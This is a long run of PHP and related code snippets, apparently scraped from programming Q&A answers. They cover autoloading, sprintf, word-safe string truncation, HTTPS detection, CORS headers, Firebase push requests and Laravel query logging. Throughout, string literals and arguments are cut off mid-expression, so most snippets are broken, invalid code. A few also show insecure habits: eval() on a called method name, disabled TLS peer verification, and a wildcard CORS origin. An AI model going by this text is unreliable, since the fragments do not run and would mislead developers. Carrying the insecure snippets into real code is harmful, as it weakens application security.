$instance = $class->newInstanceArgs(["Banana", "Apple")]);
if(!empty($array)) echo else echo if(sizeof($array)>1) echo else echo
$arr = array( ); if (isset($arr[ echo "Yup, more than one."; } else { echo "Nope, not more than one."; }
spl_autoload_register( function myAutoloader($className) { $path = include $path.$className. } $myClass = new MyClass();
spl_autoload_register( spl_autoload_register( spl_autoload_register( spl_autoload_register( class MyAutoloader { public static function ClassLoader($className) { } public static function LibraryLoader($className) { }
set_include_path(get_include_path().PATH_SEPARATOR. spl_autoload_extensions( spl_autoload_register();
<?php spl_autoload_register(); var_dump(new Main\Application);
$fp = fopen("xlsfile: if (!is_resource($fp)) { die("Cannot open excel file"); } $data= array( array("Name" => "Bob Loblaw", "Age" => 50), array("Name" => "Popo Jijo", "Age" => 75), array("Name" => "Tiny Tim", "Age" => 90) ); fwrite($fp, serialize($data)); fclose($fp);
interface AllMagicMethods { public function __get($fieldName); public function __set($fieldName, $value); public function __isset($fieldName); public function __unset($fieldName); public function __call($funcName, $args); public static function __callStatic($funcName, $args); public function __sleep(); public function __wakeup(); public function __toString(); public function __invoke($arguments, $...); public static function __set_state($array); }
$person = new stdClass(); $person->name = $person->age = 5;
$string = $person[ $string = "$person->name is $person->age years old.";
return array( ), ); $config = include echo $config[
$record = get_record($id) or throw new Exception("...");
set_include_path(get_include_path() . PATH_SEPARATOR .
function __autoload($classname) { include_once($classname . }
$foo = $bar = echo $$foo; function bar() { echo } function foobar() { echo } $foo(); $$foo();
<?php function test() { $args = func_get_args(); echo $args[2]; echo $args[1]; } test(1,3, ?>
function render_template($template_name, $context, $as_string=false) { extract($context); if ($as_string) ob_start(); include TEMPLATE_DIR . if ($as_string) return ob_get_clean(); }
foreach (range(date("Y"), date("Y")+20) as $i) { print "\t<option value=\"{$i}\">{$i}</option>\n"; }
<?php function foo($arg1) { static $cache; if( !isset($cache[md5($arg1)]) ) { $cache[md5($arg1)] = $results; } return $cache[md5($arg1)]; } ?>
class style { .... function set_bg_colour($c) { $this->{ } }
echo <<<EOM <div id="someblock"> <img src="{$file}" /> </div> EOM;
$str = echo $str; $str[0] = echo $str; $str[4] = null; echo $str;
list($a, $b) = array($b, $a); $arr = array( array( array( ); list(list($a, $b), list($c, $d)) = $arr; echo "$a $b $c $d"; while (list($arr1[], $arr2[], $arr3[]) = mysql_fetch_row($res)) { .. } foreach($data as $row) list($col_1[], $col_2[], $col_3[]) = $row; $foo = $condition ? list($foo, $bar) = $condition ? array(
$foo = ${$custom? $foo = $custom?$P[ foreach ($all_rows as $row) ${ $string = ${$string} = echo ${$string}; echo $GLOBALS[ ${ echo ${ echo $GLOBALS[
class foo { function __call($func, $args) { eval ($func); } } $x = new foo; $x->{
$foo = $strlen = echo "$foo is {$strlen($foo)} characters long.";
$control_defaults = array( $control_5 = $control_defaults + array(
function MyMethod($VarICareAbout, $VarIDontCareAbout =
import java.util.regex.*; Pattern p = Pattern.compile("cat"); Matcher m = p.matcher("one cat") if (m.find()) { }
function clean($string) { $string = str_replace( return preg_replace( }
function clean($string) { $string = str_replace( $string = preg_replace( return preg_replace( }
function hyphenize($string) { $dict = array( "I "thier" => "their", ); return strtolower( preg_replace( array( array( cleanString( str_replace( array_keys($dict), array_values($dict), urldecode($string) ) ) ) ); } function cleanString($text) { $utf8 = array( ); return preg_replace(array_keys($utf8), array_values($utf8), $text); }
$str = preg_replace( $str = preg_replace( $str = preg_replace(
function hyphenize($string) { return preg_replace( array( array( urldecode($string) ) ; } print implode("\n", array_map( function($s) { return $s . }, array( "I " ))); Never%20gonna%20give%20you%20up becomes never-gonna-give-you-up I
function seo_friendly_url($string){ $string = str_replace(array( $string = preg_replace( $string = preg_replace( $string = htmlentities($string, ENT_COMPAT, $string = preg_replace( $string = preg_replace(array( return strtolower(trim($string, }
$user = User::where( if(count($user) > 0) { echo "There is data"; } else echo "No data";
@if (count($errors) > 0) <div class="alert alert-danger"> <ul> @foreach ($errors->all() as $error) <li>{{ $error }}</li> @endforeach </ul> </div> @endif
$user = User::where( if($user > 0) { echo "There is data"; } else echo "No data";
if ( User::find( $userId ) === null ) { return "user does not exist"; } else { $user = User::find( $userId ); return $user; }
if ($user = User::whereEmail(Input::get( } $userExists = User::whereEmail(Input::get(
$factorial = function( $n ) use ( $factorial ) { if( $n <= 1 ) return 1; return $factorial( $n - 1 ) * $n; }; print $factorial( 5 );
$factorial = function( $n ) use ( &$factorial ) { if( $n == 1 ) return 1; return $factorial( $n - 1 ) * $n; }; print $factorial( 5 );
function fix( $func ) { return function() use ( $func ) { $args = func_get_args(); array_unshift( $args, fix($func) ); return call_user_func_array( $func, $args ); }; } $factorial = function( $func, $n ) { if ( $n == 1 ) return 1; return $func( $n - 1 ) * $n; }; $factorial = fix( $factorial ); print $factorial( 5 );
<?php var_dump((function ($n) { return $n < 2 ? 1 : $n * callee()($n - 1); })(5));
$x = function($depth = 0) { if($depth++) return; $this($depth); echo "hi\n"; }; $x = $x->bindTo($x); $x();
XDEBUG_CONFIG="idekey=PHPSTORM" PHP_IDE_CONFIG="serverName=server_name" php -dxdebug.remote_host=`echo $SSH_CLIENT | cut -d "=" -f 2 | awk
php -dxdebug.remote_enable=1 -dxdebug.remote_autostart=On -dxdebug.idekey=netbeans-xdebug -dxdebug.remote_host=NAME.OF.HOST script.php
php -dxdebug.remote_host=`echo $SSH_CLIENT | cut -d "=" -f 2 | awk
php -d xdebug.idekey=PHPSTORM artisan db:seed --force
$dbt=debug_backtrace(DEBUG_BACKTRACE_IGNORE_ARGS,2); $caller = isset($dbt[1][
$e = new Exception; var_dump($e->getTraceAsString());
<?php /* This function will return the name string of the function that called $function. To return the caller of your function, either call get_caller(), or get_caller(__FUNCTION__). */ function get_caller($function = NULL, $use_stack = NULL) { if ( is_array($use_stack) ) { $stack = $use_stack; } else { $stack = debug_backtrace(); echo "\nPrintout of Function Stack: \n\n"; print_r($stack); echo "\n"; } if ($function == NULL) { $function = get_caller(__FUNCTION__, $stack); } if ( is_string($function) && $function != "" ) { for ($i = 0; $i < count($stack); $i++) { $curr_function = $stack[$i]; if ( $curr_function["function"] == $function && ($i + 1) < count($stack) ) { return $stack[$i + 1]["function"]; } } } return ""; } function woman() { $caller = get_caller(); if ($caller != "") { echo $caller , "() called " , __FUNCTION__ , "(). No surprises there.\n"; } else { echo "no-one called ", __FUNCTION__, "()\n"; } } function man() { woman(); } man(); ?>
Printout of Function Stack: Array ( [0] => Array ( [file] => /Users/Aram/Development/Web/php/examples/get_caller.php [line] => 46 [function] => get_caller [args] => Array ( ) ) [1] => Array ( [file] => /Users/Aram/Development/Web/php/examples/get_caller.php [line] => 56 [function] => woman [args] => Array ( ) ) [2] => Array ( [file] => /Users/Aram/Development/Web/php/examples/get_caller.php [line] => 60 [function] => man [args] => Array ( ) ) ) man() called woman(). No surprises there.
$callers=debug_backtrace(); foreach($callers as $call) { echo "<br>" . $call[ }
SELECT * FROM mytable ORDER BY coloumn1 DESC, coloumn2 ASC
SELECT * FROM `users` ORDER BY `name` DESC, `email` ASC
MyTable::orderByRaw("coloumn1 DESC, coloumn2 ASC"); ->get();
SELECT * FROM `my_tables` ORDER BY `coloumn1` DESC, `coloumn2` ASC
$query = DB::table( foreach ($request->get( $query->orderBy($column, $direction); } $results = $query->get();
public function findAll(array $where = [], array $with = [], array $orderBy = [], int $limit = 10) { $result = $this->model->with($with); $dataSet = $result->where($where) ->when(!empty($orderBy), function ($query) use ($orderBy) { $pairs = array_chunk($orderBy, 2); foreach ($pairs as $pair) { $query->orderBy(...$pair); } }) ->paginate($limit) ->appends(Input::except( return $dataSet; }
$str = "The quick brown fox jumps over the lazy dog." $str2 = substr($str, 4);
function String2Stars($string= $begin = substr($string,0,$first); $middle = str_repeat($rep,strlen(substr($string,$first,$last))); $end = substr($string,$last); $stars = $begin.$middle.$end; return $stars; }
$string1 = "tarunmodi"; $first4 = substr($string1, 4); echo $first4; Output: nmodi
$num = "+918883967576"; $str = substr($num, 3); echo $str;
<?php function removeChar($value) { $value2 = substr($value, 4); return $value2; } echo removeChar("Dummy Text. Sample Text."); ?>
$output = sprintf("Here is the result: %s for this date %s", $result, $date);
echo sprintf(_("Here is the result: %s for this date %s"), $result, $date);
not_found = "%s could not be found." bad_argument = "Bad arguments for function %s." bad_arg_no = "Bad argument %d for function %s."
not_found = "A keresett eljárás (%s) nem található." bad_argument = "Érvénytelen paraméterek a(z) %s eljárás hívásakor." bad_arg_no = "Érvénytelen %d. paraméter a(z) %s eljárás hívásakor."
/** * throws exception with message($name = "ExampleMethod"): * - using en.txt: ExampleMethod could not be found. * - using hu.txt: A keresett eljárás (ExampleMethod) nem található. */ throw new Exception(sprintf(Language::Get( /** * throws exception with message ($param_index = 3, $name = "ExampleMethod"): * - using en.txt: Bad argument 3 for function ExampleMethod. * - using hu.txt: Érvénytelen 3. paraméter a(z) ExampleMethod eljárás hívásakor. */ throw new Exception(sprintf(Language::Get(
$username = mysql_real_escape_string($_POST[ $query = sprintf("INSERT INTO `Users` SET `user`=
"<p>Some big paragraph ".$a["name"]." again have tot ake care of space and stuff .". $a["age"]. "also would be hard to keep track of punctuations and stuff in a really ".$a["token"]. paragarapoh.";
sprintf("Some big paragraph %s. Again have to take care of space and stuff.%s also wouldnt be hard to keep track of punctuations and stuff in a really %s paragraph",$a,$b,$c);
"<p>Some big paragraph ".$a["name"]." again have to take care of space and stuff .". $a["age"]. "also would be hard to keep track of punctuations and stuff in a really ".$a["token"]. paragraph.";
$query = sprintf("SELECT * from articles where id = %d;",$_GET[
$mail_body = "Hello %s, ..."; $oneMail = sprintf($mail_body, "Victor"); $anotherMail = sprintf($mail_body, "Juan");
define( sprintf(TEXT_MESSAGE, "Var1"); sprintf(TEXT_MESSAGE, "Var2"); sprintf(TEXT_MESSAGE, "Var3");
$oranges = -2.34; echo sprintf("There are %d oranges in the basket", $oranges); Output: There are -2 oranges in the basket
$oranges = -5.67; echo sprintf("There are %d oranges in the basket", abs($oranges)); Output: There are 5 oranges in the basket
$oranges = -3.14; $apples = 1.5; echo sprintf("There are %d oranges and %d apples", abs($oranges), abs($apples)); Output: There are 3 oranges and 4 apples
$output = sprintf("Here is the result: %s for this date %s", $result, $date);
printf("Hello %s", "world"); sprintf("Hello %s", "world"); echo sprintf("Hello %s", "world"); $a = sprintf("Hello %s", "world"); echo $a;
$.ajax({ type: "GET", url: "http: data: "id=" + id + "&url=" + url, dataType: cache: false, success: function(data) { var friend = data[1]; var blog = data[2]; $( } });
$origin = $_SERVER[ $allowed_domains = [ ]; if (in_array($origin, $allowed_domains)) { header( }
$http_origin = $_SERVER[ $allowed_domains = array( ); if (in_array($http_origin, $allowed_domains)) { header("Access-Control-Allow-Origin: $http_origin"); }
Response.AddHeader("Access-Control-Allow-Origin", "*");
class CorsAccessControl { private $allowed = array(); /** * Always adds your own domain with the current ssl settings. */ public function __construct() { $this->allowed[] = . ( ( array_key_exists( && $_SERVER[ && strtolower( $_SERVER[ ? : null ) . } /** * Optionally add additional domains. Each is only added one time. */ public function add($domain) { if ( !in_array( $domain, $this->allowed ) { $this->allowed[] = $domain; } /** * Send */ public function send() { $domains = implode( header( } }
$cors = new CorsAccessControl(); $cors->send(); foreach ($domains as $domain) { $cors->add($domain); } $cors->send();
$year = 11; $month = 4; $stamp = $year.add_single_zero_if_needed($month); echo $stamp;
<?php $num = 4; $num_padded = sprintf("%02d", $num); echo $num_padded; ?>
(posts (id, user_id, ...)) User::find(1)->posts->get();
$queries = DB::getQueryLog(); $last_query = end($queries);
<script type="text/javascript"> var queries = {{ json_encode(DB::getQueryLog()) }}; console.log( console.log( queries.forEach(function(query) { console.log( }); console.log( console.log( </script>
DB::enableQueryLog(); $queries = DB::getQueryLog(); foreach($queries as $i=>$query) { Log::debug("Query $i: " . json_encode($query)); }
DB::listen(function($sql, $bindings, $time) { var_dump($sql); });
Event::listen( { foreach ($bindings as $val) { $sql = preg_replace( } Log::info($sql); });
Event::listen( { \Log::info($sql . ", with[" . join( });
$queries = \DB::getQueryLog(); $last_query = end($queries); foreach ($last_query[ $last_query[ } dd($last_query);
$student = DB::table( $query = DB::getQueryLog(); $lastQuery = end($query); print_r($lastQuery);
<a href="page2.php?varname=<?php echo $var_value ?>">Page2</a>
<form method="get" action="page2.php"> <input type="hidden" name="varname" value="var_value"> <input type="submit"> </form>
$var_value = $_GET[ $var_value = $_POST[ $var_value = $_REQUEST[
<?php session_start(); $_SESSION[ ?> <form method="get" action="get_reg.php"> <input type="text" name="regName" value=""> <input type="submit"> </form>
<?php session_start(); $regValue = $_GET[ echo "Your registration is: ".$regValue."."; ?> <p><a href="set_reg.php">Back to set_reg.php</a>
<?php $myVariable = "Some text";?> <form method="post" action="page2.php"> <input type="hidden" name="text" value="<?php echo $myVariable; ?>"> <button type="submit">Submit</button> </form>
**page 1** <form action="exapmple.php?variable_name=$value" method="POST"> <button> <input type="hidden" name="x"> </button> </form>`
curl -X POST --header "Authorization: key=<API_ACCESS_KEY>" \ --Header "Content-Type: application/json" \ https: -d "{\"to\":\"<YOUR_DEVICE_ID_TOKEN>\",\"notification\":{\"body\":\"Yellow\"},\"priority\":10}"
function sendGCM($message, $id) { $url = $fields = array ( $id ), "message" => $message ) ); $fields = json_encode ( $fields ); $headers = array ( ); $ch = curl_init (); curl_setopt ( $ch, CURLOPT_URL, $url ); curl_setopt ( $ch, CURLOPT_POST, true ); curl_setopt ( $ch, CURLOPT_HTTPHEADER, $headers ); curl_setopt ( $ch, CURLOPT_RETURNTRANSFER, true ); curl_setopt ( $ch, CURLOPT_POSTFIELDS, $fields ); $result = curl_exec ( $ch ); echo $result; curl_close ( $ch ); } ?>
Content-Type: application/json Authorization: key=your api key
{ "notification": { "title": "Your Title", "text": "Your Text", "click_action": "OPEN_ACTIVITY_1" }, "data": { "keyname": "any value " }, "to" : "to_id(firebase refreshedToken)" }
<intent-filter> <action android:name="OPEN_ACTIVITY_1" /> <category android:name="android.intent.category.DEFAULT" /> </intent-filter>
curl -H "Content-type: application/json" -H "Authorization:key=<Your Api key>" -X POST -d
curl -H "Content-type: application/json" -H "Authorization:key=<Your Api key>" -X POST -d
curl -H "Content-type: application/json" -H "Authorization:key=<Your Api key>" -X POST -d
Content-type: application/json Authorization:key=<Your Api key>
{ "data": { "score": "5x1", "time": "15:10" }, "to": "<registration token>" }
{ "to": "/topics/foo-bar", "data": { "message": "This is a Firebase Cloud Messaging Topic Message!" } }
{ "to": "<aUniqueKey>", "data": { "hello": "This is a Firebase Cloud Messaging Device Group Message!" } }
<?php $action=$_GET["Action"]; switch ($action) { Case "M": $r=$_GET["r"]; $t=$_GET["t"]; $m=$_GET["m"]; $j=json_decode(notify($r, $t, $m)); $succ=0; $fail=0; $succ=$j->{ $fail=$j->{ print "Success: " . $succ . "<br>"; print "Fail : " . $fail . "<br>"; break; default: print json_encode ("Error: Function not defined ->" . $action); } function notify ($r, $t, $m) { if (!defined( $tokenarray = array($r); $msg = array ( ); $fields = array ( ); $headers = array ( ); $ch = curl_init(); curl_setopt( $ch,CURLOPT_URL, curl_setopt( $ch,CURLOPT_POST, true ); curl_setopt( $ch,CURLOPT_HTTPHEADER, $headers ); curl_setopt( $ch,CURLOPT_RETURNTRANSFER, true ); curl_setopt( $ch,CURLOPT_SSL_VERIFYPEER, false ); curl_setopt( $ch,CURLOPT_POSTFIELDS, json_encode( $fields ) ); $result = curl_exec($ch ); curl_close( $ch ); return $result; } ?>
String SCOPE = "https: String FCM_ENDPOINT = "https: GoogleCredential googleCredential = GoogleCredential .fromStream(new FileInputStream("firebase-private-key.json")) .createScoped(Arrays.asList(SCOPE)); googleCredential.refreshToken(); String token = googleCredential.getAccessToken(); final MediaType mediaType = MediaType.parse("application/json"); OkHttpClient httpClient = new OkHttpClient(); Request request = new Request.Builder() .url(FCM_ENDPOINT) .addHeader("Content-Type", "application/json; UTF-8") .addHeader("Authorization", "Bearer " + token) .post(RequestBody.create(mediaType, jsonMessage)) .build(); Response response = httpClient.newCall(request).execute(); if (response.isSuccessful()) { log.info("Message sent to FCM server"); }
JSONObject json = new JSONObject(); try { JSONObject userData=new JSONObject(); userData.put("title","your title"); userData.put("body","your body"); json.put("data",userData); json.put("to", receiverFirebaseToken); } catch (JSONException e) { e.printStackTrace(); } JsonObjectRequest jsonObjectRequest = new JsonObjectRequest("https: @Override public void onResponse(JSONObject response) { Log.i("onResponse", "" + response.toString()); } }, new Response.ErrorListener() { @Override public void onErrorResponse(VolleyError error) { } }) { @Override public Map<String, String> getHeaders() throws AuthFailureError { Map<String, String> params = new HashMap<String, String>(); params.put("Authorizationey=" + SERVER_API_KEY); params.put("Content-Typepplication/json"); return params; } }; MySingleton.getInstance(context).addToRequestQueue(jsonObjectRequest);
Get a view on following link. It will help you. https:
class A { public function func_instance() { echo "in ", __METHOD__, "\n"; } public function callDynamic() { echo "in ", __METHOD__, "\n"; B::dyn(); } } class B extends A { public static $prop_static = public $prop_instance = public function func_instance() { echo "in ", __METHOD__, "\n"; /* this is one exception where :: is required to access an * instance member. * The super implementation of func_instance is being * accessed here */ parent::func_instance(); A::func_instance(); } public static function func_static() { echo "in ", __METHOD__, "\n"; } public function __call($name, $arguments) { echo "in dynamic $name (__call)", "\n"; } public static function __callStatic($name, $arguments) { echo "in dynamic $name (__callStatic)", "\n"; } } echo echo $a = new A; $b = new B; echo echo echo /* This is more tricky * in the first case, a static call is made because $this is an * instance of A, so B::dyn() is a method of an incompatible class */ echo /* in this case, an instance call is made because $this is an * instance of B (despite the fact we are in a method of A), so * B::dyn() is a method of a compatible class (namely, it * same class as the object */ echo
class Math { public static function sin($angle) { return ...; } } $result = Math::sin(123);
class Rectangle { protected $x, $y; public function __construct($x, $y) { $this->x = $x; $this->y = $y; } } class Square extends Rectangle { public function __construct($x) { parent::__construct($x, $x); } }
class Hello { public function say() { echo } } $h = new Hello(); $h->say();
class Test { public $name; public function __construct() { $this->name = } public static function doWrite($name) { print } public function write() { print $this->name; } }
foreach ($fruits as $fruit => $color) echo "$fruit is $color in color.";
/* * Get current error_reporting value, * so that we don * and accidently reenable message types disabled in those. * * If you want to disable e.g. E_STRICT on a global level, * use php.ini (or .htaccess for folder-level) */ $old_error_reporting = error_reporting(); /* * Disable E_STRICT on top of current error_reporting. * * Note: do NOT use ^ for disabling error message types, * as ^ will re-ENABLE the message type if it happens to be disabled already! */ error_reporting($old_error_reporting & ~E_STRICT); /* * Optional, depending on if/what code comes after. * Restore old settings. */ error_reporting($old_error_reporting);
<?php error_reporting(E_ALL); $great = echo "This is { $great}"; echo "This is {$great}"; echo "This is ${great}"; echo "This square is {$square->width}00 centimeters broad."; echo "This works: {$arr[ echo "This works: {$arr[4][3]}"; echo "This is wrong: {$arr[foo][3]}"; echo "This works: {$arr[ echo "This works: " . $arr[ echo "This works too: {$obj->values[3]->name}"; echo "This is the value of the var named $name: {${$name}}"; echo "This is the value of the var named by the return value of getName(): {${getName()}}"; echo "This is the value of the var named by the return value of \$object->getName(): {${$object->getName()}}"; echo "This is the return value of getName(): {getName()}"; ?>
<?php $a = echo "qwe{$a}rty"; echo "qwe" . $a . "rty"; echo echo "qwe$arty"; ?>
$number = 4; print "You have the {$number}th edition book";
$periods=array( foreach ($periods as $period) { $this->{ }
class timevalues { public $value_hour; public $value_day; public $value_month; public $values=array(); public function __construct() { $this->value_hour=0; $this->value_day=0; $this->value_month=0; $this->values=array( ); } }
$data = $wpdb->get_results("select * from {$wpdb->prefix}download_monitor_files");
$array1 = [ $array2 = [ print_r($array1 + $array2);
Array ( [0] => one [1] => two [foo] => bar [2] => five )
$union = $array1; foreach ($array2 as $key => $value) { if (false === array_key_exists($key, $union)) { $union[$key] = $value; } }
Array ( [0] => one [1] => two [foo] => baz [2] => three [3] => four [4] => five )
$user_vars = array("username"=>"John Doe"); $default_vars = array("username"=>"Unknown", "email"=>"no-reply@domain.com"); $config = $user_vars + $default_vars;
Array(2){ "username" => "John Doe", "email" => "no-reply@domain.com" }
$a = array(2 => "a2", 4 => "a4", 5 => "a5"); $b = array(1 => "b1", 3 => "b3", 4 => "b4");
print_r($a+$b); Array ( [2] => a2 [4] => a4 [5] => a5 [1] => b1 [3] => b3 )
print_r(array_merge($a, $b)); Array ( [0] => a2 [1] => a4 [2] => a5 [3] => b1 [4] => b3 [5] => b4 )
$array1 = array( $array2 = array( print_r($array1 + $array2); print_r(array_replace($array2, $array1));
Array ( [0] => one [1] => two [foo] => bar [2] => five ) Array ( [0] => one [1] => two [2] => five [foo] => bar )
function array_plus($a, $b){ $results = array(); foreach($a as $k=>$v) if(!isset($results[$k]))$results[$k] = $v; foreach($b as $k=>$v) if(!isset($results[$k]))$results[$k] = $v; return $results; }
$var1 = "example"; $var2 = "test"; $output = array_merge((array)$var1,(array)$var2); print_r($output);
if(isset($_SERVER[ if ($_SERVER[ $secure_connection = true; } }
function isSecure() { return (!empty($_SERVER[ || $_SERVER[ }
$isSecure = false; if (isset($_SERVER[ $isSecure = true; } elseif (!empty($_SERVER[ $isSecure = true; } $REQUEST_PROTOCOL = $isSecure ?
<VirtualHost *:443> SetEnv HTTPS on DocumentRoot /var/www/vhost/scratch/content ServerName scratch.example.com </VirtualHost>
$pv_sslport=443; $pv_serverport=80; $pv_servername="mysite.com"; if(!isset($_SERVER["SERVER_NAME"]) || !$_SERVER["SERVER_NAME"]) { if(!isset($_ENV["SERVER_NAME"])) { getenv("SERVER_NAME"); $_SERVER["SERVER_NAME"]=$_ENV["SERVER_NAME"]; } } if(!$_SERVER["SERVER_NAME"]) ( } if(!isset($_SERVER["SERVER_PORT"]) || !$_SERVER["SERVER_PORT"]) { if(!isset($_ENV["SERVER_PORT"])) { getenv("SERVER_PORT"); $_SERVER["SERVER_PORT"]=$_ENV["SERVER_PORT"]; } } if(!$_SERVER["SERVER_PORT"]) ( } $pv_URIprotocol = isset($_SERVER["HTTPS"]) ? (($_SERVER["HTTPS"]==="on" || $_SERVER["HTTPS"]===1 || $_SERVER["SERVER_PORT"]===$pv_sslport) ? "https:
public static function isHttps() { if (array_key_exists("HTTPS", $_SERVER) && return true; } if (array_key_exists("SERVER_PORT", $_SERVER) && 443 === (int)$_SERVER["SERVER_PORT"]) { return true; } if (array_key_exists("HTTP_X_FORWARDED_SSL", $_SERVER) && return true; } if (array_key_exists("HTTP_X_FORWARDED_PROTO", $_SERVER) && return true; } return false; }
if(!empty($_SERVER["HTTPS"])) if($_SERVER["HTTPS"]!=="off") return 1; else return 0; else return 0;
$pv_URIprotocol = isset($_SERVER["HTTPS"]) ? (($_SERVER["HTTPS"]==="on" || $_SERVER["HTTPS"]===1 || $_SERVER["SERVER_PORT"]===$pv_sslport) ? "https:
RewriteEngine on RewriteCond %{HTTPS} =on [NC] RewriteRule .* - [E=HTTPS:on,NE]
/** * Determine if this is a secure HTTPS connection * * @return bool True if it is a secure HTTPS connection, otherwise false. */ function isSSL() { if (isset($_SERVER[ if ($_SERVER[ return true; } elseif ($_SERVER[ return true; } } elseif ($_SERVER[ return true; } return false; }
function isSSL() { $https = filter_input(INPUT_SERVER, $port = filter_input(INPUT_SERVER, if ($https) { if ($https == 1) { return true; } elseif ($https == return true; } } elseif ($port == return true; } return false; }
function hasSSL($url) { $domain = parse_url($url, PHP_URL_HOST); $ch = curl_init( curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_CUSTOMREQUEST, curl_setopt($ch, CURLOPT_NOBODY, true); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); curl_setopt($ch, CURLOPT_VERBOSE, 0); curl_setopt($ch, CURLOPT_HEADER, 1); curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10); curl_exec($ch); $header = curl_getinfo($ch, CURLINFO_HTTP_CODE); if ($header === 200) { return true; } return false; }
$https = !empty($_SERVER[ !empty($_SERVER[ strcasecmp($_SERVER[ return ($https) ?
if (!empty($_SERVER[ { $secure_connection = true; }
substr($string, 0, strpos(wordwrap($string, $your_desired_width), "\n"));
if (strlen($string) > $your_desired_width) { $string = wordwrap($string, $your_desired_width); $string = substr($string, 0, strpos($string, "\n")); }
function tokenTruncate($string, $your_desired_width) { $parts = preg_split( $parts_count = count($parts); $length = 0; $last_part = 0; for (; $last_part < $parts_count; ++$last_part) { $length += strlen($parts[$last_part]); if ($length > $your_desired_width) { break; } } return implode(array_slice($parts, 0, $last_part)); }
class TokenTruncateTest extends PHPUnit_Framework_TestCase { public function testBasic() { $this->assertEquals("1 3 5 7 9 ", tokenTruncate("1 3 5 7 9 11 14", 10)); } public function testEmptyString() { $this->assertEquals("", tokenTruncate("", 10)); } public function testShortString() { $this->assertEquals("1 3", tokenTruncate("1 3", 10)); } public function testStringTooLong() { $this->assertEquals("", tokenTruncate("toooooooooooolooooong", 10)); } public function testContainingNewline() { $this->assertEquals("1 3\n5 7 9 ", tokenTruncate("1 3\n5 7 9 11 14", 10)); } }
$WidgetText = substr($string, 0, strrpos(substr($string, 0, 200),
/** * Truncates the given string at the specified length. * * @param string $str The input string. * @param int $width The number of chars at which the string will be truncated. * @return string */ function truncate($str, $width) { return strtok(wordwrap($str, $width, "...\n"), "\n"); }
print truncate("This is very long string with many chars.", 25);
<?php $longString = "I have a code snippet written in PHP that pulls a block of text."; $truncated = substr($longString,0,strpos($longString, echo $truncated;
function shorten($string, $width) { if(strlen($string) > $width) { $string = wordwrap($string, $width); $string = substr($string, 0, strpos($string, "\n")); } return $string; }
function neat_trim($str, $n, $delim= $len = strlen($str); if ($len > $n) { preg_match( return rtrim($matches[1]) . $delim; } else { return $str; } }
function wholeWordTruncate($s, $characterCount) { if (preg_match("/^.{1,$characterCount}\b/su", $s, $match)) return $match[0]; return $s; }
function wholeWordTruncate($s, $characterCount) { if (preg_match("/^.{1,$characterCount}\b/su", $s, $match)) return $match[0]; return mb_substr($return, 0, $characterCount); }
function wholeWordTruncate($s, $characterCount, $addEllipsis = { $return = $s; if (preg_match("/^.{1,$characterCount}\b/su", $s, $match)) $return = $match[0]; else $return = mb_substr($return, 0, $characterCount); if (strlen($s) > strlen($return)) $return .= $addEllipsis; return $return; }
$matches = array(); $result = preg_match("/^(.{1,199})[\s]/i", $text, $matches);
$result = preg_match("/^(.{1,199})[\n]/i", $text, $matches);
function neatest_trim($content, $chars) if (strlen($content) > $chars) { $content = str_replace( $content = str_replace("\n", $content = strip_tags(trim($content)); $content = preg_replace( $content = trim($content) . return $content; }
/* Cut the string without breaking any words, UTF-8 aware * param string $str The text string to split * param integer $start The start position, defaults to 0 * param integer $words The number of words to extract, defaults to 15 */ function wordCutString($str, $start = 0, $words = 15 ) { $arr = preg_split("/[\s]+/", $str, $words+1); $arr = array_slice($arr, $start, $words); return join( }
if(strlen($very_long_text) > 120) { $matches = array(); preg_match("/^(.{1,120})[\s]/i", $very_long_text, $matches); $trimmed_text = $matches[0]. }
<?php function stripByWords($string,$length,$delimiter = $words_array = explode(" ",$string); $strlen = 0; $return = foreach($words_array as $word) { $strlen += mb_strlen($word, $return .= $word." "; if($strlen >= $length) { $strlen = 0; $return .= $delimiter; } } return $return; } ?>
$string = "I appreciate your service & idea to provide the branded toys at a fair rent price. This is really a wonderful to watch the kid not just playing with variety of toys but learning faster compare to the other kids who are not using the BooksandBeyond service. We wish you all the best"; print_r(substr($string, 0, strpos(wordwrap($string, 250), "\n")));
function _truncate($str, $limit) { if(strlen($str) < $limit) return $str; $uid = uniqid(); return array_shift(explode($uid, wordwrap($str, $limit, $uid))); }
<?php $your_desired_width = 200; $string = $var->content; if (strlen($string) > $your_desired_width) { $string = wordwrap($string, $your_desired_width); $string = substr($string, 0, strpos($string, "\n")) . " More..."; } echo $string; ?>
function substr_full_word($str, $start, $end){ $pos_ini = ($start == 0) ? $start : stripos(substr($str, $start, $end), if(strlen($str) > $end){ $pos_end = strrpos(substr($str, 0, ($end + 1)), if(empty($pos_end)){ $pos_end = $end; } return substr($str, $pos_ini, $pos_end); }
if ((strpos($string, $WidgetText = substr($string, 0, strrpos(substr($string, 0, 200), } elseif (strlen($string) > 200) { $WidgetText = substr($string, 0, 200); }
if (strlen($string)>$max_length) { $string_cropped=substr($string,0,$max_length-$buffer); $last_space=strrpos($string_cropped, " "); if ($last_space>0) { $string_cropped=substr($string_cropped,0,$last_space); } $abbreviated_string=$string_cropped."&nbsp;..."; } else { $abbreviated_string=$string; } return $abbreviated_string;
substr($string, 0, strrpos(substr($string, 0, $comparingLength),
substr($string, 0, strrpos(substr($string, 0, $comparingLength-strlen($currentString)),
<?php $string = "Your line of text"; $spl = preg_match("/([, \.\d\- if (isset($matches[0])) { $matches[0] .= "..."; echo "<br />" . $matches[0]; } else { echo "<br />" . $string; } ?>
function get_client_ip() { $ipaddress = if (getenv( $ipaddress = getenv( else if(getenv( $ipaddress = getenv( else if(getenv( $ipaddress = getenv( else if(getenv( $ipaddress = getenv( else if(getenv( $ipaddress = getenv( else if(getenv( $ipaddress = getenv( else $ipaddress = return $ipaddress; }
function get_client_ip() { $ipaddress = if (isset($_SERVER[ $ipaddress = $_SERVER[ else if(isset($_SERVER[ $ipaddress = $_SERVER[ else if(isset($_SERVER[ $ipaddress = $_SERVER[ else if(isset($_SERVER[ $ipaddress = $_SERVER[ else if(isset($_SERVER[ $ipaddress = $_SERVER[ else if(isset($_SERVER[ $ipaddress = $_SERVER[ else $ipaddress = return $ipaddress; }
$ip = getenv( getenv( getenv( getenv( getenv( getenv(
